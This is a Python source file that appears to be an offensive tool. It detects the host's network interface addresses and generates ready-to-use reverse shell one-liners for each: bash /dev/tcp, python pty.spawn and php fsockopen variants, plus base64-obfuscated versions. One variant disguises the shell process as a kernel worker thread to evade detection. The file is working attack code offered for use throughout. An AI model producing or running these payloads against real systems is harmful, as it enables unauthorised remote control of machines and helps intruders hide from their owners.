from __future__ import annotations

import base64
import subprocess
from typing import Optional

def _get_interfaces() -> dict[str, str]:
    result = {}
    try:
        out = subprocess.check_output(["ip", "-4", "addr", "show"], text=True)
        iface = None
        for line in out.splitlines():
            line = line.strip()
            if line and line[0].isdigit():
                iface = line.split(":")[1].strip().split("@")[0]
            elif line.startswith("inet ") and iface:
                ip = line.split()[1].split("/")[0]
                if ip != "127.0.0.1":
                    result[iface] = ip
    except Exception:
        pass
    return result

def _b64_payload(ip: str, port: int) -> str:
    raw = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    return base64.b64encode(raw.encode()).decode()

def _build_payloads(ip: str, port: int) -> dict[str, str]:
    return {
        "bash":        f'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
        "bash (alt)":  f'bash -i >& /dev/tcp/{ip}/{port} 0>&1',
        "python3":     f'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "python":      f'python -c \'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")\'',
        "php":         f'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
        "memfd (bash)":        f'bash <(echo {_b64_payload(ip, port)} | base64 -d)',
        "memfd (spoof argv)":  f'exec -a \'[kworker/0:1]\' bash <(echo "{_b64_payload(ip, port)}" | base64 -d)',
        "memfd (sh compat)":   f'bash <(printf \'%s\' "{_b64_payload(ip, port)}" | base64 -d)',
    }

class PayloadGenerator:

    def __init__(self, port: int = 4444):
        self.port = port

    def get_interfaces(self) -> dict[str, str]:
        return _get_interfaces()

    def for_interface(self, iface: str) -> dict[str, str] | None:
        interfaces = _get_interfaces()
        if iface not in interfaces:
            return None
        return _build_payloads(interfaces[iface], self.port)

    def for_all(self) -> dict[str, dict[str, str]]:
        return {
            iface: _build_payloads(ip, self.port)
            for iface, ip in _get_interfaces().items()
        }